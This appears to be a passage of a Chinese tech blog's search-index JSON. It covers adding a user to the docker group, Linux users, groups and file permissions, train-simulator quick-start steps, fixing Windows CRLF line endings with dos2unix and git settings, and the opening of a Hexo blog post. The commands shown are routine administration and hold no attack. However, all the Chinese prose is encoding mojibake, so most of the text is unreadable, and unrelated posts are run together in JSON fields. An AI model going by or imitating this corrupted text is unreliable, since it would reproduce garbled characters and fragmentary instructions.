docker test2 é‡æ–°ç™»é™†ssh æˆ–è€… log out åœ¨ç™»é™†å, æŸ¥çœ‹ ç”¨æˆ·æ ‡è¯† $ id test1 # uid=1001(test1) gid=1001(test1) groups=1001(test1),,998(docker) # å¯ä»¥å‘ç°å¤šäº†dockerçš„ ç»„æ ‡è¯† # æ­¤æ—¶è¿è¡Œdocker info æµ‹è¯• $ docker info Client: Context: default Debug Mode: false Plugins: app: Docker App (Docker Inc., v0.9.1-beta3) buildx: Build with BuildKit (Docker Inc., v0.6.1-docker) scan: Docker Scan (Docker Inc., v0.8.0) æ‹‰å– docker images æµ‹è¯•test1æ‹‰å»dockeré•œåƒ $ docker pull sizaif2000/ubuntu2004v1:1.0 ubuntu:20.04 V1 ä½¿ç”¨æ¸…åæº å·²å®‰è£…åŸºæœ¬å·¥å…·: VIM - Vi IMproved 8.1 (2018 May 18, compiled Apr 15 2020 06:40:31) cmake version 3.16.3 gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04) g++ (4:9.3.0-1ubuntu2). wget,git,autoconf,automake,build-essential Python 3.8.10 (default, Jun 2 2021, 10:49:15) pip3 pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) ubuntu:20.04 V2 ä½¿ç”¨æ¸…åæº å·²å®‰è£…åŸºæœ¬å·¥å…·: VIM - Vi IMproved 8.1 (2018 May 18, compiled Apr 15 2020 06:40:31) cmake version 3.16.3 gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04) g++ (4:9.3.0-1ubuntu2). wget,git,autoconf,automake,build-essential Python 3.8.10 (default, Jun 2 2021, 10:49:15) pip3 pip 20.0.2 from /usr/lib/python3/dist-packages/pip (python 3.8) ==java-jdk1.8.0_291== å‚è€ƒçŸ¥è¯† æ·»åŠ /ç§»é™¤ sudo æƒé™ ç»™æŸä¸ªç”¨æˆ·æ·»åŠ  sudo æƒé™ $ sudo adduser XXXX sudo ç§»é™¤æŸä¸ªç”¨æˆ·sudoæƒé™ $ sudo deluser xxxx sudo ==æ³¨æ„!!!== ç§»é™¤sudoæ—¶, ç®¡ç†ç”¨ä¸è¦æŠŠå”¯ä¸€çš„ç®¡ç†å‘˜çš„sudoæƒé™ç§»é™¤æ‰, å¦åˆ™éœ€è¦ root ç”¨æˆ·é‡æ–°æ·»åŠ  ubuntuç”¨æˆ·ç»„ ç”¨æˆ·å’Œç”¨æˆ·æ ‡è¯†å· ç”¨æˆ· æˆ‘ä»¬ç™»å½•åˆ°Linuxç³»ç»Ÿï¼Œä½¿ç”¨çš„ç™»å½•åå’Œå¯†ç å®é™…ä¸Šå°±æ˜¯ç”¨æˆ·çš„ä¿¡æ¯æ ‡è¯†ã€‚ç”¨æˆ·æ‹¥æœ‰è´¦å·ã€ç™»å½•åã€çœŸå®å§“åã€å¯†ç ã€ä¸»ç›®å½•ã€é»˜è®¤shellç­‰å±æ€§ã€‚æ¯ä¸ªç”¨æˆ·å®é™…ä¸Šä»£è¡¨äº†ä¸€ç»„æƒé™ï¼Œè€Œè¿™äº›æƒé™åˆ†åˆ«è¡¨ç¤ºå¯ä»¥æ‰§è¡Œä¸åŒçš„æ“ä½œï¼Œæ˜¯èƒ½å¤Ÿè·å–ç³»ç»Ÿèµ„æºçš„æƒé™çš„é›†åˆã€‚ ç”¨æˆ·æ ‡è¯†å· Linuxå®é™…ä¸Šå¹¶ä¸ç›´æ¥è®¤è¯†ç”¨æˆ·çš„è´¦å·ï¼Œè€Œæ˜¯æŸ¥çœ‹ç”¨æˆ·æ ‡è¯†å·ã€‚ ç”¨æˆ·æ ‡è¯†å·ï¼ˆæ•´æ•°ï¼‰ï¼š 0ï¼š rootï¼Œè¶…çº§ç”¨æˆ·ã€‚ 1-499ï¼šç³»ç»Ÿç”¨æˆ·ï¼Œä¿è¯ç³»ç»ŸæœåŠ¡æ­£å¸¸è¿è¡Œï¼Œä¸€èˆ¬ä¸ä½¿ç”¨ã€‚ 500-60000ï¼šæ™®é€šç”¨æˆ·ï¼Œå¯ç™»å½•ç³»ç»Ÿï¼Œæ‹¥æœ‰ä¸€å®šçš„æƒé™ã€‚ç®¡ç†å‘˜æ·»åŠ çš„ç”¨æˆ·åœ¨æ­¤èŒƒå›´å†…ã€‚ ç”¨æˆ·åå’Œæ ‡è¯†å·ä¸ä¸€å®šä¸€ä¸€å¯¹åº”ï¼ŒLinuxå…è®¸å‡ ä¸ªç™»å½•åå¯¹åº”åŒä¸€ä¸ªç”¨æˆ·æ ‡è¯†å·ã€‚ ç³»ç»Ÿå†…éƒ¨ç®¡ç†è¿›ç¨‹å’Œæ–‡ä»¶è®¿é—®æƒé™æ—¶ä½¿ç”¨ç”¨æˆ·æ ‡è¯†å·ã€‚ è´¦å·å’Œæ ‡è¯†å·çš„å¯¹åº”å…³ç³»åœ¨/etc/passwdæ–‡ä»¶ä¸­ã€‚ /etc/passwdæ–‡ä»¶ è¯¥æ–‡ä»¶æ‰€æœ‰è€…å’Œæ‰€å±ç»„ä¸ºrootï¼Œé™¤äº†rootç”¨æˆ·å¤–åªæœ‰è¯»å–çš„æƒé™ã€‚ æ ¼å¼ï¼šç™»å½•åï¼šå£ä»¤ï¼šç”¨æˆ·æ ‡è¯†å·ï¼šç»„æ ‡è¯†å·ï¼šæ³¨é‡Šï¼šç”¨æˆ·ä¸»ç›®å½•ï¼šShellç¨‹åº ç™»å½•åï¼šåŒæ„ç³»ç»Ÿä¸­å”¯ä¸€ï¼Œå¤§å°æ•æ„Ÿã€‚ å£ä»¤ï¼šå¯†ç ï¼Œrootå’Œç”¨æˆ·å¯ä½¿ç”¨passwdå‘½ä»¤ä¿®æ”¹ã€‚ ç”¨æˆ·æ ‡è¯†å·ï¼šå”¯ä¸€ã€‚ ç»„æ ‡è¯†å·ï¼šæ¯ä¸ªç”¨æˆ·å¯ä»¥åŒæ—¶å±äºå¤šä¸ªç»„ã€‚ æ³¨é‡Šï¼šç›¸å…³ä¿¡æ¯ï¼ŒçœŸå®å§“åã€è”ç³»ç”µè¯ç­‰ã€‚mailå’Œfingerç­‰ä¼šä½¿ç”¨è¿™äº›ä¿¡æ¯ã€‚ ç”¨æˆ·ä¸»ç›®å½•ï¼šç”¨æˆ·ç™»å½•åçš„é»˜è®¤å·¥ä½œç›®å½•ã€‚rootä¸º/rootï¼Œä¸€èˆ¬ç”¨æˆ·åœ¨/homeä¸‹ã€‚ Shellç¨‹åºï¼šç™»å½•åé»˜è®¤å¯åŠ¨çš„Shellç¨‹åºã€‚ /etc/shadowæ–‡ä»¶ åŒ…å«ç”¨æˆ·çš„å¯†ç å’Œè¿‡æœŸæ—¶é—´ï¼Œåªæœ‰rootç»„å¯è¯»å†™ã€‚ æ ¼å¼ï¼šç™»å½•åï¼šåŠ å¯†å£ä»¤ï¼šæœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€å°æ—¶é—´é—´éš”ï¼šæœ€å¤§æ—¶é—´é—´éš”ï¼šè­¦å‘Šæ—¶é—´ï¼šå¯†ç ç¦ç”¨æœŸï¼šè´¦æˆ·å¤±æ•ˆæ—¶é—´ï¼šä¿ç•™å­—æ®µ ç™»å½•åï¼šç•¥ã€‚ åŠ å¯†å£ä»¤ï¼š*è¡¨ç¤ºè´¦æˆ·è¢«é”å®šï¼Œï¼è¡¨ç¤ºå¯†ç è¢«é”å®šã€‚å…¶ä»–çš„å‰ä¸‰ä½è¡¨ç¤ºåŠ å¯†æ–¹å¼ã€‚ æœ€åä¸€æ¬¡ä¿®æ”¹æ—¶é—´ï¼šæœ€è¿‘ä¿®æ”¹å¯†ç çš„æ—¶é—´ï¼Œå¤©ä¸ºå•ä½ï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ã€‚ æœ€å°æ—¶é—´é—´éš”ï¼šæœ€å°ä¿®æ”¹å¯†ç çš„æ—¶é—´é—´éš”ã€‚ æœ€å¤§æ—¶é—´é—´éš”ï¼šæœ€é•¿å¯†ç æœ‰æ•ˆæœŸï¼Œåˆ°æœŸè¦æ±‚ä¿®æ”¹å¯†ç ã€‚ è­¦å‘Šæ—¶é—´ï¼šå¯†ç è¿‡æœŸåå¤šä¹…å‘å‡ºè­¦å‘Šã€‚ å¯†ç ç¦ç”¨æœŸï¼šå¯†ç è¿‡æœŸåä»ç„¶æ¥å—çš„æœ€é•¿æœŸé™ã€‚ è´¦å·å¤±æ•ˆæ—¶é—´ï¼šè´¦æˆ·çš„æœ‰æ•ˆæœŸï¼Œ1970å¹´1æœˆ1æ—¥ç®—èµ·ï¼Œç©ºä¸²è¡¨ç¤ºæ°¸ä¸è¿‡æœŸã€‚ ä¿ç•™å­—æ®µï¼šä¿ç•™å°†æ¥ä½¿ç”¨ã€‚ ç”¨æˆ·ç»„å’Œç»„æ ‡è¯†å· ç”¨æˆ·ç»„ ç”¨æˆ·ç»„æŒ‡ï¼Œä¸€ç»„æƒé™å’ŒåŠŸèƒ½ç›¸ç±»ä¼¼çš„ç”¨æˆ·çš„é›†åˆã€‚ Linuxæœ¬èº«é¢„å®šä¹‰äº†è®¸å¤šç”¨æˆ·ç»„ï¼ŒåŒ…æ‹¬rootã€daemonã€binã€sysç­‰ï¼Œç”¨æˆ·å¯æ ¹æ®éœ€è¦è‡ªè¡Œæ·»åŠ ç”¨æˆ·ç»„ã€‚ ç”¨æˆ·ç»„æ‹¥æœ‰ç»„åã€ç»„æ ‡è¯†å·ã€ç»„æˆå‘˜ç­‰å±æ€§ã€‚ ç”¨æˆ·ç»„ç¼–å· Linuxå†…éƒ¨é€šè¿‡ç»„æ ‡è¯†å·æ¥æ ‡è¯†ç”¨æˆ·ç»„ã€‚ ç”¨æˆ·ç»„ä¿¡æ¯ä¿å­˜åœ¨ /etc/group ä¸­ã€‚ /etc/groupæ–‡ä»¶ æ ¼å¼ï¼šç»„åï¼šå£ä»¤ï¼šç»„æ ‡è¯†ç¬¦ï¼šæˆå‘˜åˆ—è¡¨ /etc/passwdæ–‡ä»¶æŒ‡å®šçš„ç”¨æˆ·ç»„åœ¨/etc/groupä¸­ä¸å­˜åœ¨åˆ™æ— æ³•ç™»å½•ã€‚ ç”¨æˆ·ç®¡ç† æ·»åŠ ç”¨æˆ· useraddå‘½ä»¤ $ useradd [option] ç™»å½•å # optionå‚æ•°è‡ªè¡ŒæŸ¥é˜…ã€‚ # ä¸€èˆ¬åŠ -måˆ›å»ºç›®å½•ã€‚ adduserå‘½ä»¤ $ adduser [option] user å¦‚æœæ²¡æœ‰æŒ‡å®šâ€“systemå’Œâ€“groupé€‰é¡¹ï¼Œåˆ™åˆ›å»ºæ™®é€šç”¨æˆ·ã€‚ å¦åˆ™åˆ›å»ºç³»ç»Ÿç”¨æˆ·æˆ–ç”¨æˆ·ç»„ã€‚ ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼šusermod $ usermod [option] ç”¨æˆ·å # å…·ä½“é€‰é¡¹ä¿¡æ¯è‡ªè¡ŒæŸ¥é˜…ã€‚ åˆ é™¤ç”¨æˆ·ï¼šuserdel $ userdel [option] ç”¨æˆ·å # -fï¼šå¼ºåˆ¶åˆ é™¤ï¼ˆè°¨æ…ä½¿ç”¨ï¼‰ # -rï¼šä¸»ç›®å½•ä¸­çš„æ–‡ä»¶ä¸€å¹¶åˆ é™¤ã€‚ ä¿®æ”¹ç”¨æˆ·å¯†ç ï¼špasswd $ passwd [option] ç™»å½•å æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ $ id [option] [ç”¨æˆ·] ç”¨æˆ·é—´åˆ‡æ¢ï¼šsuå‘½ä»¤ $ su [option] [ç”¨æˆ·å] # ç”¨æˆ·åä¸º - ï¼Œåˆ™åˆ‡æ¢åˆ°rootç”¨æˆ·ã€‚ å—é™çš„ç‰¹æƒï¼šsudoå‘½ä»¤ sudoä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨è‡ªå·±çš„ç¯å¢ƒä¸‹ï¼Œæ‰§è¡Œéœ€è¦rootæƒé™çš„å‘½ä»¤ã€‚ è¯¥ä¿¡æ¯ä¿å­˜åœ¨/etc/sudoersä¸­ã€‚ ç”¨æˆ·ç»„ç®¡ç† æ·»åŠ ç”¨æˆ·ç»„ addgroupå‘½ä»¤ ç±»ä¼¼adduser groupadd ç±»ä¼¼useradd ä¿®æ”¹ç”¨æˆ·ç»„ ç±»ä¼¼usermodï¼Œä½¿ç”¨groupmodã€‚ åˆ é™¤ç”¨æˆ·ç»„ ç±»ä¼¼userdelï¼Œä½¿ç”¨groupdelã€‚ æƒé™ç®¡ç† æƒé™ç»„ ä¸€èˆ¬åˆ›å»ºæ–‡ä»¶çš„äººä¸ºæ‰€æœ‰è€…ï¼Œå…¶æ‰€å±çš„ä¸»ç»„ä¸ºæ‰€å±ç»„ï¼Œå…¶ä»–ç”¨æˆ·ä¸ºå…¶ä»–ç»„ã€‚ åŸºæœ¬æƒé™ç±»å‹ ä¸‰ç§ï¼šè¯»ã€å†™ã€æ‰§è¡Œã€‚ æƒé™åŠå…¶è¡¨ç¤ºå€¼ï¼š è¯»ï¼šræˆ–4 å†™ï¼šwæˆ–2 æ‰§è¡Œï¼šxæˆ–1 ç‰¹æ®Šæƒé™ setuidã€setgidå’Œé»æ»ä½ã€‚ setuidå’Œsetgidèƒ½ä»¥æ–‡ä»¶æ‰€æœ‰è€…æˆ–æ‰€å±ç»„çš„èº«ä»½è¿è¡Œã€‚ é»æ»ä½ä½¿å¾—åªæœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…æ‰å¯ä»¥é‡å‘½åå’Œåˆ é™¤æ–‡ä»¶ã€‚ è®¿é—®æ§åˆ¶åˆ—è¡¨ è®¿é—®æ§åˆ¶è¡¨ACLå¯ä»¥é’ˆå¯¹æŸä¸ªç”¨æˆ·æˆ–è€…ç”¨æˆ·ç»„å•ç‹¬è®¾ç½®è®¿é—®æƒé™ã€‚ æ”¹å˜æ–‡ä»¶æ‰€æœ‰è€…chownå‘½ä»¤ $ chown [option]...[owner][:[group]] file... æ”¹å˜æ–‡ä»¶æ‰€å±ç»„chgrpå‘½ä»¤ ç”¨æˆ·ä¸å—æ–‡ä»¶çš„æ–‡ä»¶ä¸»æˆ–è¶…çº§ç”¨æˆ·ä¸èƒ½ä¿®æ”¹ç»„ã€‚ è®¾ç½®æƒé™æ©ç umaskå‘½ä»¤ æ–‡ä»¶çš„æƒé™ä¸º666-æ©ç  ç›®å½•çš„æƒé™ä¸º777-æ©ç  ä¿®æ”¹æ–‡ä»¶è®¿é—®æƒé™ $ chmod [option]...mode[,mode]...file... â€œ+â€ï¼šå¢åŠ æƒé™ â€œ-â€ï¼šå‡å°‘æƒé™ â€œ=â€ï¼šè®¾ç½®æƒé™ ä¿®æ”¹æ–‡ä»¶ACLï¼šsetfaclå‘½ä»¤ $ setfacl [option] file... æŸ¥è¯¢æ–‡ä»¶çš„ACL $ getfacl [æ–‡ä»¶å]","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.sizaif.com/tags/Docker/"}],"author":"sizaif"},{"title":"TSW-2 åˆ—è½¦æ“ä½œæ‰‹å†Œåˆé›†","slug":"TSW-2-åˆ—è½¦æ“ä½œæ‰‹å†Œåˆé›†","date":"2021-08-29T03:27:02.000Z","updated":"2021-09-19T07:24:21.354Z","comments":true,"path":"posts/238e4ec1/","link":"","permalink":"https://www.sizaif.com/posts/238e4ec1/","excerpt":"","text":"F40PH-3Cå‹å·æ“ä½œæ‰‹å†Œ the F40PH-3C is a locomotive used on the MBTA Commuter Rail. It is featured in Boston Sprinter. å¿«é€Ÿå¯åŠ¨ ä¸»ç”µæ± æ‰“å¼€ æ— çº¿ç”µä¿é™©ä¸æ‰“å¼€ æŒ‰ä½å¼•æ“å¯åŠ¨å¼€å…³4s æŒ‰ä½åˆ—è½¦ä¾›ç”µå¼•æ“å¯åŠ¨4s äº¤æµç”µæŒ‰é’® æ‰“å¼€ åˆ—è½¦ç”µåŠ›è®¾ç½®ä¸º â€œé•¿æœºç½©æ‹–è½¦â€ éš”ç¦»å¼€å…³è®¾ç½®ä¸ºè¿è¡Œ æ–­æµé˜€è®¾ç½®ä¸º&quot;åˆ‡å…¥&quot; MU-2Aé˜€é—¨è®¾ç½®ä¸º â€œå¯¼è”æˆ–æ–­å¼€â€ å¼•æ“è¿è¡Œè®¾ç½®ä¸ºæ‰“å¼€ ç”µæœºç£åœºè®¾ç½®ä¸ºæ‰“å¼€ æ§åˆ¶ä¸ç‡ƒæ–™æ³µè®¾ç½®ä¸ºæ‰“å¼€ ç”µç©ºåˆ¶åŠ¨è®¾ç½®ä¸ºæ‰“å¼€ è®¾ç½®ä¸»é’¥åŒ™æ’å…¥ æ­¤æ—¶çŠ¶æ€ä¸º: æ‰“å¼€è½¦é—¨è¿å®¢U åå‘å™¨è®¾ç½®ä¸º: å‰ç‰µä½ ( æ­¤æ—¶é˜€é—¨è¦è®¾ç½®ç©ºæŒ¡) è®¾ç½®åˆ—è½¦å•ç‹¬åˆ¶åŠ¨ä¸º &quot; ç¼“è§£&quot; å¢åŠ é˜€é—¨ä¸Šè°ƒåŠ¨åŠ› å‰è¿› åˆ—è½¦å¯åŠ¨ done CTC-3 å‹å·æ“ä½œæ‰‹å†Œ å¿«é€Ÿå¯åŠ¨ å‘ç”µæœºç£åœºè®¾ç½®ä¸ºæ‰“å¼€ å¼•æ“è¿è¡Œè®¾ç½®ä¸ºæ‰“å¼€ ç”µç©ºåˆ¶åŠ¨æ§åˆ¶è®¾ç½®ä¸ºæ‰“å¼€ åå‘å™¨è®¾ç½®ä¸ºç©ºæŒ¡ æ–­æµé˜€è®¾ç½®ä¸ºå®¢è¿ æ‰“å¼€è½¦é—¨ä¸Šå®¢ åå‘å™¨è®¾ç½®ä¸º: å‰ç‰µä½ ( æ­¤æ—¶é˜€é—¨è¦è®¾ç½®ç©ºæŒ¡) åˆ¶åŠ¨è®¾ç½®ä¸ºç¼“è§£ å¢åŠ é˜€é—¨ä¸Šè°ƒåŠ¨åŠ› åˆ—è½¦å¯åŠ¨done å¾·é“ 403&quot;ICE3&quot;æœºå‹æ‰‹å†Œ å¿«é€Ÿå¯åŠ¨ èŠ‚æµé˜€å¯åŠ¨å¢åŠ åŠ¨åŠ› 423 æœºå‹æ‰‹å†Œ å¿«é€Ÿå¯åŠ¨ æ’å…¥åå‘å™¨é’¥åŒ™ åå‘å™¨è®¾ç½®ä¸ºå‰ç‰µå¼• å¼€å¯è½¦é—¨ æ–½åŠ åŠ¨åŠ›å¼€å¯ç«è½¦ ( ä¸»æ§å™¨å‘å‰æ–½åŠ ç™¾åˆ†æ¯”åŠ¨åŠ›/ å‘åè®¾ç½®åˆ¶åŠ¨å‡é€Ÿ)","categories":[{"name":"æ¸¸æˆå‘","slug":"æ¸¸æˆå‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%B8%B8%E6%88%8F%E5%90%91/"},{"name":"TSW2","slug":"æ¸¸æˆå‘/TSW2","permalink":"https://www.sizaif.com/navigation/categories/%E6%B8%B8%E6%88%8F%E5%90%91/TSW2/"}],"tags":[{"name":"TSW2","slug":"TSW2","permalink":"https://www.sizaif.com/tags/TSW2/"}],"author":"sizaif"},{"title":"è§£å†³Winå¹³å°ä¸Šlinuxè™šæ‹Ÿæœºè„šæœ¬æ ¼å¼é—®é¢˜","slug":"è§£å†³Winå¹³å°ä¸Šlinuxè™šæ‹Ÿæœºè„šæœ¬æ ¼å¼é—®é¢˜","date":"2021-08-24T12:26:15.000Z","updated":"2021-09-19T10:09:19.033Z","comments":true,"path":"posts/448c4b49/","link":"","permalink":"https://www.sizaif.com/posts/448c4b49/","excerpt":"","text":"è§£å†³Winå¹³å°ä¸Šlinuxè™šæ‹Ÿæœºè„šæœ¬æ ¼å¼é—®é¢˜ é—®é¢˜æè¿° ç»å¸¸ä¼šæœ‰ä»¥ä¸‹ä½¿ç”¨åœºæ™¯: åœ¨windowså¹³å°ä¸Šç¼–å†™è„šæœ¬,å¤åˆ¶è„šæœ¬åˆ°dockerå®¹å™¨linuxä¸­è¿è¡Œ,æˆ–è€…å¤åˆ¶åˆ°linuxè™šæ‹Ÿæœºä¸­è¿è¡Œ. å°å°ä¼šæŠ¥é”™: $'\\r' command not found è¿™æ ·çš„é”™è¯¯ åŸå› åœ¨äº: Carriage-Return å›è½¦ç¬¦\\r Line-Feed æ¢è¡Œç¬¦\\n windowså¹³å°ä½¿ç”¨çš„æ ¼å¼æ˜¯CRLF ç»“å°¾æ˜¯ \\r\\n; è€Œ linux å’ŒmacOSå¹³å°ä½¿ç”¨çš„æ˜¯LFç»“å°¾æ˜¯\\n ;è€ŒMACå¹³å°ä½¿ç”¨çš„æ˜¯CR ç»“å°¾æ˜¯\\r è€çš„Macç³»ç»Ÿï¼ˆMac OS, OS Xï¼‰ï¼š \\r æ–°çš„Macç³»ç»Ÿï¼ˆmacOSï¼‰:\\n åœ¨2001å¹´ä»¥å‰çš„Macæ“ä½œç³»ç»Ÿï¼Œç§°ä¸ºClassic Mac OSï¼Œè¡Œæœ«é‡‡ç”¨â€\\râ€ï¼Œè¿™ä¸€ç³»åˆ—æ“ä½œç³»ç»Ÿçš„æœ€åä¸€ä¸ªç‰ˆæœ¬æ˜¯1999å¹´å‘å¸ƒçš„Mac OS 9ï¼› ä»2001å¹´3æœˆå‘å¸ƒçš„Mac OS 10.0å¼€å§‹ï¼Œè¡Œæœ«é‡‡ç”¨â€\\nâ€ï¼Œç§°ä¸ºmacOSæˆ–OS X æŸ¥çœ‹è„šæœ¬æ ¼å¼ 1.cat -A filenameï¼Œå¦‚æœè¾“å‡ºç»“æœä¸­è¡Œæœ«å°¾æ˜¯^M$ï¼Œåˆ™æ˜¯dosæ ¼å¼ï¼Œå¦‚æœè¡Œæœ«å°¾åªæ˜¯$ï¼Œåˆ™æ˜¯unixæ ¼å¼ã€‚ 2.vim filenameï¼Œç¼–è¾‘æ–‡ä»¶ï¼Œæ‰§è¡Œâ€œ:set ffâ€,è‹¥æ‰§è¡Œç»“æœä¸ºfileformat=dosåˆ™ä¸ºdosæ ¼å¼ï¼Œè‹¥æ‰§è¡Œç»“æœä¸ºfileformat=unixåˆ™ä¸ºunixæ ¼å¼ã€‚ 3.od -t x1 filenameï¼Œä»¥16è¿›åˆ¶æŸ¥çœ‹æ–‡ä»¶ï¼Œè‹¥è¾“å‡ºç»“æœä¸­å­˜åœ¨â€œ0d 0aâ€åˆ™ä¸ºdosæ ¼å¼ï¼Œå¦‚æœåªæœ‰â€œ0aâ€åˆ™ä¸ºunixæ ¼å¼ã€‚å…¶ä¸­â€œ0dâ€å³ä¸ºå›è½¦ç¬¦â€œ\\râ€ï¼Œâ€œ0aâ€å³ä¸ºæ¢è¡Œç¬¦â€œ\\nâ€ã€‚ è§£å†³æ–¹æ³• å½“ç„¶æ˜¯æƒ³åŠæ³•æŠŠwindowså¹³å°ä¸‹çš„è„šæœ¬è½¬æ¢æˆ LFå‘€ å¦‚æœæœ‰vim\\vi â€‹ vimå†…æ‰§è¡Œ Shift + ; :set ff = unix :wq ä½¿ç”¨dos2unix å·¥å…· å¦‚æœç”¨çš„æ˜¯ git bash é‚£ä¹ˆè¯¥å®¢æˆ·ç«¯å·²ç»è‡ªå¸¦äº† dos2unix å¦‚æœä¸æ˜¯çš„è¯å‰æéœ€è¦å…ˆå®‰è£…dos2unix http://dos2unix.sourceforge.net/ ä¾‹å¦‚: æˆ‘ä½¿ç”¨çš„æ˜¯ CygWin64 Mintty æ§åˆ¶å° é‚£ä¹ˆæˆ‘åªéœ€è¦æ‰§è¡Œå³å¯ $ apt-cyg install dos2unix dos2unix ä½¿ç”¨æ–¹æ³• # ä½¿ç”¨æ–¹æ³• $ dos2unix filename # æˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤,å¼ºåˆ¶è½¬æ¢ $ find . -type f -exec dos2unix &#123;&#125; + # -f --force Force conversion of all files. Also binary files. ä½¿ç”¨sed å‘½ä»¤ $ sed -e â€˜s/.$//â€™ dosfile > unixfile é€šå¸¸æƒ…å†µä¸‹æ˜¯å®Œå…¨å¯ä»¥å®ç°çš„, ä½†è¿™ä¸ªæ–¹æ³•ä¸æ˜¯100%çš„è§£å†³æ–¹æ³• git è·¨å¹³å°åä½œå¼€å‘, ç»åœºä¼šå‡ºç°åœ¨winå¹³å°ä¸‹,ä½¿ç”¨git clone å‘½ä»¤å°†é¡¹ç›®æºç ä¸‹è½½ä¸‹æ¥å,æ‹¿åˆ°linuxè™šæ‹Ÿæœºä¸­è¿è¡Œ,å‡ºç°æ¢è¡Œç¬¦é”™è¯¯çš„é—®é¢˜, åŸå› åœ¨äºwinå¹³å°ä½¿ç”¨gitçš„æ—¶å€™, gitè‡ªåŠ¨å°†æ¢è¡Œç¬¦æ›¿æ¢ä¸º\\r\\n, è¿™æ—¶å€™å†æ‹¿åˆ°linuxä¸­è¿è¡Œå½“ç„¶å°±ä¸è¡Œäº†. è¿˜å¥½ Git åœ¨è®¾è®¡æ—¶å°±è€ƒè™‘äº†è¿™ä¸€ç‚¹ï¼Œå…¶æä¾›äº†ä¸€ä¸ª autocrlf çš„é…ç½®é¡¹ï¼Œç”¨äºåœ¨æäº¤å’Œæ£€å‡ºæ—¶è‡ªåŠ¨è½¬æ¢æ¢è¡Œç¬¦ï¼Œè¯¥é…ç½®æœ‰ä¸‰ä¸ªå¯é€‰é¡¹ï¼š true: æäº¤æ—¶è½¬æ¢ä¸º LFï¼Œæ£€å‡ºæ—¶è½¬æ¢ä¸º CRLF false: æäº¤æ£€å‡ºå‡ä¸è½¬æ¢ input: æäº¤æ—¶è½¬æ¢ä¸ºLFï¼Œæ£€å‡ºæ—¶ä¸è½¬æ¢ # æäº¤æ—¶è½¬æ¢ä¸ºLFï¼Œæ£€å‡ºæ—¶è½¬æ¢ä¸ºCRLF git config --global core.autocrlf true # æäº¤æ—¶è½¬æ¢ä¸ºLFï¼Œæ£€å‡ºæ—¶ä¸è½¬æ¢ git config --global core.autocrlf input # æäº¤æ£€å‡ºå‡ä¸è½¬æ¢ git config --global core.autocrlf false æŸ¥çœ‹å½“å‰git config é…ç½® $ git config --list http.proxy=socks5://127.0.0.1:7890 https.proxy=socks5://127.0.0.1:7890 user.name=XXXX user.email=XXXX core.autocrlf=true å¦‚æœæŠŠ autocrlf è®¾ç½®ä¸º false æ—¶ï¼Œé‚£å¦ä¸€ä¸ªé…ç½®é¡¹ safecrlf æœ€å¥½è®¾ç½®ä¸º tureã€‚è¯¥é€‰é¡¹ç”¨äºæ£€æŸ¥æ–‡ä»¶æ˜¯å¦åŒ…å«æ··åˆæ¢è¡Œç¬¦ï¼Œå…¶æœ‰ä¸‰ä¸ªå¯é€‰é¡¹ true: æ‹’ç»æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶ false: å…è®¸æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶ warn: æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶æ—¶ç»™å‡ºè­¦å‘Š # æ‹’ç»æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶ git config --global core.safecrlf true # å…è®¸æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶ git config --global core.safecrlf false # æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦çš„æ–‡ä»¶æ—¶ç»™å‡ºè­¦å‘Š git config --global core.safecrlf warn åƒæ¯”å¦‚æˆ‘, å†winä¸Šå¼€å‘,ä½¿ç”¨gitæäº¤åˆ°github, ç»å¸¸ä»githubä¸Šä¸‹è½½é¡¹ç›®,å†winä¸Šä¿®æ”¹å,æ‹¿åˆ°linuxè™šæ‹Ÿæœº/dockerä¸­è¿è¡Œ, é‚£æˆ‘çš„åšæ³•å°±æ˜¯: ä»£ç ä»“åº“ä½¿ç”¨ç»Ÿä¸€çš„æ¢è¡Œç¬¦(LF) $ git config --global core.autocrlf input $ git config --global core.safecrlf true å½“é‡åˆ°CRLFæ— æ³•æäº¤çš„æ—¶å€™, ç”¨doc2unix è½¬æ¢ä¸€ä¸‹å³å¯","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Win","slug":"æŠ€æœ¯å‘/Win","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Win/"}],"tags":[{"name":"Win","slug":"Win","permalink":"https://www.sizaif.com/tags/Win/"},{"name":"è„šæœ¬æ ¼å¼","slug":"è„šæœ¬æ ¼å¼","permalink":"https://www.sizaif.com/tags/%E8%84%9A%E6%9C%AC%E6%A0%BC%E5%BC%8F/"}],"author":"sizaif"},{"title":"Hexoåšå®¢ä¼˜åŒ–","slug":"hexoåšå®¢ä¼˜åŒ–","date":"2021-08-14T14:22:06.000Z","updated":"2021-09-19T10:09:19.014Z","comments":true,"path":"posts/83186147/","link":"","permalink":"https://www.sizaif.com/posts/83186147/","excerpt":"","text":"hexoåšå®¢ä¼˜åŒ– æœ¬åœ°ä¼˜åŒ– æ–‡ç« é“¾æ¥å”¯ä¸€ Hexoé»˜è®¤ä½¿ç”¨çš„æ–‡ç« æ°¸ä¹…é“¾æ¥æ 